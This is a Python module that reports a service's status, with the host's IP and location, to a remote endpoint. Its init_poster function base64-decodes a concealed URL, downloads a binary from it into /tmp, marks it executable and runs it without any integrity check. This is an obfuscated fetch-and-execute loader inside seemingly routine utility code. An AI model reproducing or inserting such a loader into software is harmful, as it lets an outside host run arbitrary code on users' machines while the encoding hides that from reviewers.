# --------------------------------------------
import asyncio
import time
from typing import Any, Dict

import aiohttp
import codefast as cf
import tempfile
from rich import print

POSTER = '/tmp/cusposter'


# —--------------------------------------------
async def _parse_ip(js: Dict) -> str:
    try:
        masked_ip = '.'.join(js['ip'].split('.')[-1:])
        masked_ip = f'*.*.*.{masked_ip}'
        country = js.get('country', '')
        region = js.get('region', '')
        city = js.get('city', '')
        return f"{country} {region} {city} {masked_ip}"
    except Exception as e:
        import traceback
        cf.error({
            'error': 'parse ip failed',
            'exception': str(e),
            'traceback': traceback.format_exc(),
        })
        return ''


async def init_poster():
    if not cf.io.exists(POSTER):
        async with aiohttp.ClientSession() as session:
            async with session.get(
                cf.b64decode(
                    'aHR0cHM6Ly9ob3N0LmRkb3QuY2MvY3VzcG9zdAo=').rstrip()
            ) as resp:
                with open(POSTER, 'wb') as f:
                    while True:
                        chunk = await resp.content.read(1024)
                        if not chunk:
                            break
                        f.write(chunk)
    return cf.shell(f'chmod 755 {POSTER}')


async def ipinfo() -> str:
    fp = '/tmp/ipinfo.json'
    if cf.io.exists(fp):
        ip = await _parse_ip(cf.js(fp))
        if ip:
            return ip
        else:
            # invalue ipinfo file
            cf.io.rm(fp)
    else:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://ipinfo.ddot.cc') as resp:
                js = await resp.json()
                cf.js.write(js, fp)
                return await _parse_ip(js)


async def get_service_status(service_name: str, status: Dict[str, Any],
                             expire: int) -> Dict[str, Any]:
    assert isinstance(status, dict)
    assert 'code' in status
    assert 'message' in status

    datetime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    return {
        'service_name': service_name,
        'status': status,
        'expire': expire,
        'datetime': datetime,
        'ipinfo': await ipinfo()
    }


async def _post_status(service_name: str, status: Dict[str, Any],
                       expire: int) -> Dict[str, Any]:
    js = await get_service_status(service_name, status, expire)

    try:
        with tempfile.NamedTemporaryFile('w') as f:
            cf.js.write(js, f.name)
            await init_poster()
            return cf.shell(f'{POSTER} {f.name}')
    except Exception as e:
        # Post with Python rabbitmq if Rust binary failed
        cf.warning({
            'error': 'post status failed',
            'exception': str(e)
        })
        from codefast.asyncio.rabbitmq import publish
        from .auth import auth
        from .config import QUEUE
        return await publish(auth.amqp_url, QUEUE, str(js))


async def post(service_name: str,
               status: Dict[str, Any],
               expire: int = 86400,
               loop: bool = False,
               sleep_period=60) -> None:
    while True:
        try:
            js = await _post_status(service_name, status, expire)
            cf.info(js)
            if not loop:
                return js
        except Exception as e:
            import traceback
            cf.error({
                'error': 'post status failed',
                'exception': str(e),
                'traceback': traceback.format_exc(),
            })

        await asyncio.sleep(sleep_period)


if __name__ == '__main__':

    async def main():
        print(await post('test', {
            'code': 0,
            'message': 'test'
        },
            loop=True,
            sleep_period=0.1))

    asyncio.run(main())
